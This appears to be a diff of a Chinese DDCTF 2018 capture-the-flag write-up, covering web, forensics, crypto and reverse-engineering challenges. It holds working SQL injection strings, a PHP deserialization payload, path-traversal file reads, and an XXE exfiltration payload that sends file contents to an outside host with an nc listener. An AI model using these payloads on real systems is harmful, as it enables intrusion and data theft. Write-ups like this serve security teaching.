@@ -29,6 +29,14 @@ https://github.com/LeadroyaL/attachment_repo/tree/master/didictf_2018
 
 ### 数据库的秘密
 
+题目：
+```
+[注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器
+http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php
+```
+
+解答：
+
 打开后会发现返回如下。
 ```
 非法链接，只允许来自 123.232.23.245 的访问
@@ -42,6 +50,7 @@ X-Forwarded-For:123.232.23.245
 ![](https://i.loli.net/2019/04/26/5cc2b6ad04447.png)
 
 发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。
+
 经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。
 
 ![](https://i.loli.net/2019/04/26/5cc2b6c664a0a.png)
@@ -62,37 +71,52 @@ admin' && '1'='2'#
 admin' && binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) <'z' #
 ```
 然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。
+
 首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。
+
 所以，为了省事，我选择直接将这个代码调用一下。
+
 用python的execjs库，可以直接执行js代码。
+
 最终跑起脚本，获取到`flag DDCTF{IKIDLHNZMKFUDEQE}`
 
 ![](https://i.loli.net/2019/04/26/5cc2b76bce747.png)
 
 ### 专属链接
+
 题目：
 
+```
 现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么
-提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com
-注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击
-http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e
 
+提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com
+
+注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击
+
+http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e
+```
 解答：
 
 首先打开网站，发现是滴滴的官网。。
+
 此时发现所有连接几乎全部重定向到了滴滴官网。
+
 无奈下查看元素。发现hint
 ```
 <!--/flag/testflag/yourflag-->
 ```
 尝试访问，`http://116.85.48.102:5050/flag/testflag/yourflag`发现报错500，好像是数组越界？
+
 此时尝试将`yourflag`替换为`DDCTF{1321}`，返回`failed!!!`。
+
 猜测爆破`flag`么？完全没戏啊。看样子应该有其他地方可以入手。
+
 然而又发现了主页`js`的一句神奇的话。一个`ajax`语句。
 
 ![](https://i.loli.net/2019/04/26/5cc2b77f0104c.png)
 
 然并卵，404。。。。。
+
 此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个`icon`。
 
 ![](https://i.loli.net/2019/04/26/5cc2b78faadbe.png)
@@ -100,17 +124,25 @@ http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e
 ```
 http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=
 ```
+
 访问后，发现下载了`favicon.ico`
+
 此时发现图标好像图片很奇怪。后来果然验证了这是个`hint`。
 
 ![](https://i.loli.net/2019/04/26/5cc2b7ac8246d.png)
 
 此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。
+
 美滋滋。此时也知道了题目中`hint`的用意。题目采用`springmvc+mybatis`编写
+
 百度搜索`springmvc+mybatis`文件结构，美滋滋读文件。
+
 首先，大概知道了资源文件都是在`WEB-INF`文件夹下，所以猜测这个`icon`也在这里，此时我们要先确定文件夹。
+
 `WEB-INF`下有一个`web.xml`，此时尝试读取，最终确定目录`../../WEB-INF/web.xml`。
+
 然后拖文件。这里说几点注意事项。
+
 ```
 1. 通过../../WEB-INF/web.xml确认位置。
 2. 继续根据web.xml中的内容进行文件读取。classpath是WEB-INF/classes
@@ -118,17 +150,25 @@ http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=
 4. 制造网站报错，进一步找到更多的文件
 ```
 差不多，注意一上四点，就可以拿到尽量多的源码了。
+
 拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。
+
 （此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向）
+
 此时开始苦逼的分析源码。
+
 分析后发现，存在接口，用当前用户的邮箱去生成一个flag。
+
 但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的
 
 ![](https://i.loli.net/2019/04/26/5cc2b7ba36700.png)
 
 此时又一次明白了，为什么读文件允许ks文件。
+
 来吧，首先先拿邮箱申请一个flag
+
 然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。
+
 ```
 public static String byte2hex(byte[] b)
   {
@@ -153,123 +193,179 @@ public static String byte2hex(byte[] b)
   }
 //0DFEE0968F44107479B6CF5784641060DB42952C197C7E8560C2B5F58925FAF4
 ```
+
 坑：但是此时后端仅允许post方式。且参数是以get传递的。
+
 成功获取到flag
 ```
 Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE
 ```
 然后，解密吧。。
+
 只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过）
+
 最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。
 
 https://blog.csdn.net/zbuger/article/details/51690900
+
 然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。）
+
 (╯°□°）╯︵ ┻━┻
+
 要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。
+
 通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。
+
 `DDCTF{1797193649441981961}`
 
 ###  注入的奥妙
+
 题目：
 
-本题flag不需要包含DDCTF{}，为[0-9a-f]+
-http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1
+```
 
+本题flag不需要包含DDCTF{}，为[0-9a-f]+
+
+http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1
+```
 解答：
 
 按照题目要求，这题应该是个注入题，毫无疑问。
+
 查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。
+
 ```
 1餐' and 1=1%23
 ```
+
 orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时双写绕过即可。
+
 此时查询数据库：
 ```
 1餐' uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23
 ```
+
 ![](https://i.loli.net/2019/04/26/5cc2b7d61e8fa.png)
 
 然后继续查询表名：
+
 ```
 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23
 ```
+
 此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。
 
 ![](https://i.loli.net/2019/04/26/5cc2b7f433584.png)
 
 此时祭出hex大法。数据库会直接将0x开头的进行转码解析。
+
 ```
 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23
 ```
+
 此时成功的爆出来了三个表
+
 ```
 message,route_rules,users
 ```
+
 然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。
+
 查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。
+
 通过路由信息，我们可以发现存在`static/bootstrap/css/backup.css`源码泄露。
+
 通过以下三行脚本即可保存该文件。
+
 ```
 import requests
 f=open('a.zip','wb')
 f.write(requests.get('http://116.85.48.105:5033/static/bootstrap/css/backup.css').content)
 ```
+
 接下来就是对PHP代码的审计。
+
 首先，分析路由。我们从数据表内知道了有以下几条规则
+
 ```
 get/:u/well/getmessage/:s Well#getmessage
 get/:u/justtry/self/:s JustTry#self
 post*/:u/justtry/try JustTry#try
 ```
+
 首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。
+
 第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。
 
 ![](https://i.loli.net/2019/04/26/5cc2b8063b834.png)
 
 此时看见了 unserialize ，倍感亲切，这不就是反序列化么。
+
 此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。
+
 test类，顾名思义，就是一个测试用的。
 
 ![](https://i.loli.net/2019/04/26/5cc2b846aed1b.png)
 
 此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。
+
 仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。
+
 所以，这个反序列化是个相当大的工程。自己手写是无望了。
+
 首先尝试了一下，自己写三个类的调用。。。然而失败了。
+
 最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。）
 
 ![](https://i.loli.net/2019/04/26/5cc2b86d6ea4a.png)
 
 发现，他是有一个命名空间的要求。序列化后语句如下
+
 ```
 O:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"4eaee5db-2304-4d6d-aa9c-962051d99a41";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":2:{s:3:"dbc";N;s:3:"pdo";N;}}}
 ```
+
 最终的Payload如下：
+
 ```
 url:http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/
 postdata:
 serialize=%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d
 ```
-### mini blockchain
-- 题目 ：
 
+### mini blockchain
+
+题目 ：
+```
 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？
+
 注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求
+
 题目入口：
 http://116.85.48.107:5000/b942f830cf97e
 
-- 解答 ：
+解答 ：
 
 拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。
+
 第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！
+
 时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目
+
 首先，题目给了源码，这个很棒棒。
+
 建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。
+
 在这里不做太多的理解源码的讲解。
+
 最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂）
+
 然后慢慢的开始了解区块链，最后发现这种手段。
+
 这道题目中，利用了区块链一个很神奇的东西。
+
 因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。
+
 如下图，就是此时该题目的区块链。
 
 ![](https://i.loli.net/2019/04/26/5cc2b880cf72a.png)
@@ -279,13 +375,17 @@ http://116.85.48.107:5000/b942f830cf97e
 ![](https://i.loli.net/2019/04/26/5cc2b894e8924.png)
 
 此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。
+
 但是，说的轻巧，我们该如何构造呢？
+
 首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。
 
 ![](https://i.loli.net/2019/04/26/5cc2b8a448fcc.png)
 
 只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。
+
 然而DDcoin是什么呢。
+
 在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。
 
 ![](https://i.loli.net/2019/04/26/5cc2b8b277e69.png)
@@ -297,95 +397,142 @@ hash：这个区块的hash
 height：当前处于第几个节点
 transactions：交易信息
 ```
+
 再分析transactions
+
 ```
 input与signature好像是一个凭证，验证这个区块主人身份。
 output，收款人信息
 amount，收款数额
 addr，收款地址
 ```
+
 hash这里的话，不是太明白。
+
 但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。
+
 ```
 create_output_utxo(addr_to, amount) // 新建一个output信息
 create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息
 create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块
 ```
+
 首先新建output，此时参数很简单，收货人地址（商店），数量（全款）
+
 然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash
 
 ![](https://i.loli.net/2019/04/26/5cc2b8c153754.png)
 
 此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。
+
 也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx
 
 ![](https://i.loli.net/2019/04/26/5cc2b8d0ad57b.png)
 
 然后此时tx也有了，进行下一步create_block
+
 此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx
+
 此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头，
+
 这样，我们才能添加。
+
 然后向那个添加块的地址post由create_block即可成功添加第一个块。
+
 记得改请求头中的content-type为json。还有就是cookie自己手动更新
+
 第二个块的时候，问题又来了。
+
 这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？
+
 此时可以注意到题目中init中给的hint。
 
 ![](https://i.loli.net/2019/04/26/5cc2b9928c2fc.png)
 
 凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！
-于是。。。。。通过这个方式，在后面添加几个空区块就好。
-成功伪造主链！获取一颗砖石。
-再次重复以上做法，完成第三条链即可获取到flag
-切记，手动更新cookie……
-###  我的博客
-题目 ：
 
+于是。。。。。通过这个方式，在后面添加几个空区块就好。
+
+成功伪造主链！获取一颗砖石。
+
+再次重复以上做法，完成第三条链即可获取到flag
+
+切记，手动更新cookie……
+
+###  我的博客
+
+题目 ：
+```
 提示：www.tar.gz
+
 http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d
+```
 
 解答 ：
 
 题目又给了源码，美滋滋。
 然而下载到源码后就不美滋滋了。
+
 一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。
+
 然而，你是进不去主页的。因为。。
 
 ![](https://i.loli.net/2019/04/26/5cc2b99ea8be4.png)
 
 还没进去，就被die了。
+
 然后只好分析如何能成为admin了。此时看到了。
 
 ![](https://i.loli.net/2019/04/26/5cc2b9ae23346.png)
 
 当你是通过邀请码注册的，你便可以成为admin。
+
 然而，邀请码是完全随机的。
+
 此时，想起LCTF的一道题，感觉完全一样有木有！
+
 https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F
+
 然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。
+
 此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？
 
 ![](https://i.loli.net/2019/04/26/5cc2b9bad81a4.png)
 
 然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。
+
 奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。
+
 最后还是决定看一下随机数这里。很开心，找到了这篇文章。
+
 http://drops.xmd5.com/static/drops/web-11861.html
+
 然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？
+
 满满的都是嘲讽….
+
 来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。
+
 然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！
+
 首先，大家需要先知道rand()是不安全的随机数。（然而我不知道）
+
 然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？
+
 然而作者没告诉，给的链接都是数学，看不懂…..
+
 此时PHITHON大佬的这篇文章真的是解救了自己。
+
 https://www.leavesongs.com/penetration/safeboxs-secret.html
 
 ![](https://i.loli.net/2019/04/26/5cc2b9c7260f8.png)
 
 所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。
+
 如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。
+
 此时，我们先获取他100个随机数。
+
 ```
 s = requests.Session()
 url='http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php'
@@ -395,7 +542,9 @@ for i in range(50):
 		r=s.get(url,headers=headers)
 		state.append(int(re.search(r'id="csrf" value="(.+?)" required>', r.text, re.M|re.I).group(1)))
 ```
+
 然后测试一下
+
 ```
 yuce_list=[]
 for i in range(10):
@@ -403,25 +552,33 @@ for i in range(10):
 	state.append(yuceTemp)
 	yuce_list.append(yuceTemp)
 ```
+
 此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2`147483647`才是真正的数。
+
 但此时又有了一个问题。
 
 ![](https://i.loli.net/2019/04/26/5cc2b9e8620d5.png)
 
 之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是….
+
 此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。
+
 接下来需要写如何打乱字符串。
+
 可以发现，一个很简单的流程，生成随机数，然后交换位置。
 
 ![](https://i.loli.net/2019/04/26/5cc2b9f429d7b.png)
 
 唯一不知道的地方就是其中这个地方的一个函数。
+
 此时直接去GitHub翻一下源码。
+
 https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h
 
 ![](https://i.loli.net/2019/04/26/5cc2ba0b21e6b.png)
 
 然后就是愉快的重写代码。
+
 ```
 def rand_range(rand,minN,maxN,tmax=2147483647):
 	temp1=tmax+1.0
@@ -440,7 +597,9 @@ for i in admin_old:
 	key+=i
 print(key)
 ```
+
 此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。
+
 ```
 def getAdmin(username,passwd,code):
 	data={
@@ -452,9 +611,13 @@ def getAdmin(username,passwd,code):
 	r=s.post(url,headers=headers,data=data)
 	print(r.text)
 ```
+
 切记！code是：admin###开头，后面截取32位！
+
 最后用拿到的账号进行登录即可。
+
 后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤
+
 ```
 /a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&title=-1%1$'+union+select+1,f14g,3+from+a8e79480.key+where+1+%23
 ```
@@ -475,7 +638,9 @@ Line 87: <!-- YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu -->
 ```
 
 登录进去发现跟 Web2 差不多，也是 任意文件下载漏洞。
+
 对比 Github 上 Quick4j 的源代码文件路径，把所有代码文件对应的下载下来，与原来的代码进行比较。
+
 找到关键文件，进行反编译：
 `/rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class`
 
@@ -486,6 +651,7 @@ Line 87: <!-- YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu -->
       System.err.println(wonderful);
     }
 ```
+
 找到超级管理员用户名和密码（superadmin_hahaha_2333: f5a5a608）
 
 `/rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class`
@@ -494,16 +660,21 @@ Line 87: <!-- YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu -->
   @ResponseBody
   @RequiresRoles({"super_admin"})
 ```
+
 这里以超级管理员身份，可以实现 XML 外部实体注入 漏洞。
+
 但是这里的注入没有回显，那只能用反弹实现回显了。
+
 服务器部署 `1.xml`：
+
 ```
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://222.125.86.10:23946/%file;'>">
 ```
-服务器监听端口：
-`nc -l -p 23946`
+
+服务器监听端口：`nc -l -p 23946`
 
 Payload 示例：
+
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
@@ -521,6 +692,7 @@ Payload 示例：
 ![](https://i.loli.net/2019/04/26/5cc2c57261c26.png)
 
 `Flag in intranet tomcat_2 server 8080 port.`
+
 访问 `http://tomcat_2:8080/` ：
 ```
 /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2f%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
@@ -529,6 +701,7 @@ Payload 示例：
 ![](https://i.loli.net/2019/04/26/5cc2c59010c98.png)
 
 `try to visit hello.action.`
+
 访问 http://tomcat_2:8080/hello.action ：
 ```
 /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e
@@ -653,28 +826,36 @@ XXXXXXX
 ![](https://i.loli.net/2019/04/26/5cc2bab3c095a.png)
 
 可以发现ftp传输了两个包。此时，fl-g极有可能是flag。
+
 于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。
 只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。
+
 继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧）
 wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。
+
 然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。
 
 ![](https://i.loli.net/2019/04/26/5cc2bac4038d6.png)
 
 此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。
 经过老司机多年开车经验，呸。做题经验。
+
 猜测！肯定有https流量。当然，科来也说有了。
 
 ![](https://i.loli.net/2019/04/26/5cc2bae36cad0.png)
 
 于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。
 尤其是那个图片！图片！图片！！！！
+
 ocr也不行，手写也不行。那么多字。心塞ing。
 好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。
+
 然后就是解密https流量。具体可以看这个链接。
 https://blog.csdn.net/kelsel/article/details/52758192
+
 直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。
 然后就可以解密https流量了。
+
 然后搜索ssl，追踪http流量，最后取得flag
 
 ![](https://i.loli.net/2019/04/26/5cc2baedcda2c.png)
@@ -741,6 +922,7 @@ if __name__ == "__main__":
 解答 ：
 
 从 `get_padding` 和 `aes_encrypt` 能够看出这是一个 `AES ECB 256位分组加密`加密密钥是 16字节 随机生成，`ECB`明文分组相同，对应的密文分组也相同。
+
 由此可以通过改变 `agentid` 的长度，使`flag`中的字符依次落入前面已知的明文分组中，逐字节爆破。
 
 贴出脚本：
@@ -1064,11 +1246,12 @@ patch 一下binary文件，因为是简单的 xor，所以只要能拿到xor_key
 
 ## 逆向
 
-感谢***奈沙夜影***师傅！
+感谢**奈沙夜影**师傅！
 转载自 ：https://www.anquanke.com/post/id/145553
 
 ### Baby MIPS
 IDA打开发现几个字符串结构都很清晰，提供16个变量，然后进行16次方程校验，但是运行会发现在中间就因为段错误而异常，尝试许久以后发现几个不太对劲的指令，突兀出现的t, sp, 跳转等等的机器码都为EB02开头，猜测为花指令，于是使用IDC脚本去花。
+
 注意MIPS为定长指令集，每个指令都为4字节，因此需要固定监测指令的头部，否则可能会误清除掉正常指令，例如方程参数的赋值
 (╯‵□′)╯︵┻━┻
 ```
@@ -1120,9 +1303,13 @@ AnalyzeArea(SavedStartVa, StopVa);
 Message("Clear eb02 Opcode Ok "); 
 } 
 ```
+
 去花后再次分析即可得到清晰的赋值和check过程
-有三种求解方法
-**简单粗暴反汇编**
+
+有三种求解方法:
+
+**方法一：简单粗暴反汇编**
+
 写了一个伪执行汇编的py脚本来得到参数，最后清洗一下即可得到方程，通过z3限制BitVec即可跑出整数解
 ```
 f = open("code.txt", "r")
@@ -1294,12 +1481,14 @@ except Exception as e:
 print(functions)
 # print(fp)
 ```
-**优雅反编译**
+**方法二：优雅反编译**
+
 在某zhao师傅的提醒下想起来jeb的MIPS版本可以对汇编进行简单的反编译：
 
 ![](https://i.loli.net/2019/04/26/5cc2cf1110da3.png)
 
 虽然数组全部是通过指针+偏移的方式来调用，不过可以全部复制下来再用正则来整理数据，将`*(par00+x)`替换为`par00[x/4]`的形式（可不要像某zhao师傅一样将参数一个个抄下来哟（不然就会像他一样把参数不慎抄错几个然后纠结若干小时XDDDDDD
+
 上述两种方法得到方程以后就可以通过z3, numpy, matlab一类的数学工具求解方程组了，下面给出z3py的示例代码
 ```python
 from z3 import *
@@ -1330,8 +1519,10 @@ if(s.check()==sat):
         print(chr(m[a[i]].as_long()&0xff), end='')
 ```
 
-**符号执行**
+**方法三：符号执行**
+
 无名侠师傅提出了使用angr来全自动求解的方法，注意二进制文件也需要去过花。我这边不知道是因为capstone没有mips反编译的版本还是地址扒错了跑不出来，只好直接附上师傅的脚本。
+
 注意其中find和avoid的值由于各人的bin文件不同，因此地址需要自行修正。
 ```python
 from angr import *
@@ -1374,7 +1565,9 @@ print found.solver.eval(mem)
 |a1+408|char_table_1|b|255|0x603700|
 |a1+672|func_addr|q|255|(a1+8)[84+i] 603200+i(+=)|
 |a1+672+8|func_table|q|8|(a1+8)[84+6030e0[l+255]]|
+
 输入函数形式为：
+
 ```
 for i in range(len(input)):
     *(a1+664) = input[i+1]
@@ -1382,9 +1575,13 @@ for i in range(len(input)):
         if(f[input[i]] == (a1 + 408)[(a1+8)[72+j]]):
             call (a1+8)[84 + (a1+8)[j+72]] ( a1 )
 ```
+
 可以看到，实际上就是令Input[i]作为下标取数组f的值，然后遍历char_table_1中的8个值，如有相等的则取func_addr中对应的函数来调用。
+
 一共8个函数，根据提示语可以定位到其中的一个函数，查看交叉引用则能找到另外8个函数的函数表：
+
 逐个反编译发现：
+
 |函数名|执行条件|表达式|功能|
 |--|--|--|--|
 |func_0|	(a1+288)<(a1+292)|	(a1+665) = char_table[a1+288]|	m=c[index]|
@@ -1395,17 +1592,24 @@ for i in range(len(input)):
 |check_func|	*(a1+664)==’s’|	s = char_table_0[(a1+288)], len=20,puts(s)	|check(s)|
 |func_6|	…|	(a1+288)–	|index–|
 |func_7|	…|	后一个参<=0x59|	char_table_0[a1+288] = input[*(a1+288) + *(a1+664) – 48] – 49|
+
 其中用到的变量一共有4个：
+
 ```
 a1+292 = 255
 a1+664 = [next]（即input[i+1])
 a1+665 = m（临时变量）
 a1+288 = index
 ```
+
 在check_func中会输出s，s是从char_table_0中以index为起点取的0x20个值。如果s满足三个方程则通过校验，返回成功。
+
 而实际上那三个方程是不需要逆的—题目中明示了只要输出“Binggo”即可得到flag。因此目标显然是在char_table_0中获得Binggo的字符串，将其dump出来输出了一下发现并字符顺序并没有合适的，甚至上述5个字母都不齐。以及一个最关键的问题，check_func中取了0x20个值赋给s，这显然不符合”Binggo”的要求，因此第七个字符必须给上”使其截断才行。
+
 分析其余7个函数，发现0和1可以交换char_table_0中的字符的位置，2、3和7则可以修改char_table_0中字符的值，4和6则是用来移动下标的，最后check_func加’s’来结束并输出。在构造输入之前，先要找到函数对应的输入值。
+
 逆向一下发现char_table中还被更改了值，IDA动态调试断在函数调用处调用idc脚本,即可得到对应值：
+
 ```
 auto i, j, v14, p, q;
 for(i=0;i<8;i++)
@@ -1440,9 +1644,13 @@ for(i=0;i<8;i++)
 ```
 
 得到这8个输入字符即可开始构造了。
+
 由于函数功能很多样，因此构造方法很多，在此仅表述我的构造方法：
+
 由于输入buffer有限，因此不适合向右移动指针太多来找寻合适的字符。所以我就原地变换—毕竟将一个字符变成另一个字符满打满算也只要4个输入，移动指针可就轻而易举几十上百了。
+
 下列计划中push表示将char_table中的值取入m，A->B表示将A通过func_2和3变换成B，->1表示指针后移1位
+
 ```
 push P    # $
